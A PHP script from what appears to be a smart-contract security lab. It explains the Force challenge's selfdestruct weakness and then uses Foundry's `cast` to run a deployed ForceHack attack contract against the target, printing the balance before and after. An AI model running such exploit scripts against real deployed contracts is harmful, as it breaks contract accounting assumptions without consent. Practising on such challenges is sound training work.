<?php 
include "prepare.php";
if (!$_POST):
?>
<pre>
<b>Why Force.sol is vulnerable?</b>

The Force contract cannot receive ETH because it has no payable
functions and no fallback. But Ethereum allows forcibly sending
ETH to ANY contract using selfdestruct().

If a contract selfdestructs and sends its balance to Force, ETH
will be transferred even though Force does not accept ETH normally.

This script uses an already-deployed ForceHack contract to
execute the selfdestruct exploit.
</pre>

<?php
exit;
endif;

echo "<pre>";

echo "<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== Selected Contract & Account ===
</div>";

echo "Force Contract: $CONTRACT\n";
echo "Player Index:   $PLAYER_ID\n";
echo "Player Address: $PLAYER\n\n";


// ---------------------------------------------------------------
// LOCATE ForceHack CONTRACT IN contracts.php
// ---------------------------------------------------------------
$forceHack = null;

foreach ($contractsData['contracts'] as $c) {
    // example: src/ForceHack.sol:ForceHack
    if (stripos($c['name'], 'forcehack') !== false) {
        $forceHack = $c['address'];
        break;
    }
}

if (!$forceHack) {
    echo "ERROR: ForceHack not found in contracts.php\n";
    exit;
}

echo "Using ForceHack: $forceHack\n\n";


// ---------------------------------------------------------------
// BEFORE BALANCE
// ---------------------------------------------------------------
echo "=== BALANCE BEFORE ===\n";
echo cast("cast balance $CONTRACT --rpc-url $RPC");


// ---------------------------------------------------------------
// EXECUTE EXPLOIT
// ---------------------------------------------------------------
echo "\n=== EXECUTING FORCE EXPLOIT (selfdestruct) ===\n";

echo cast(
    "cast send $forceHack \"attack(address)\" $CONTRACT " .
    "--rpc-url $RPC --private-key $PK"
);


// ---------------------------------------------------------------
// AFTER BALANCE
// ---------------------------------------------------------------
echo "\n<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== BALANCE AFTER EXPLOIT ===
</div>";

echo cast("cast balance $CONTRACT --rpc-url $RPC");

echo "</pre>";
?>
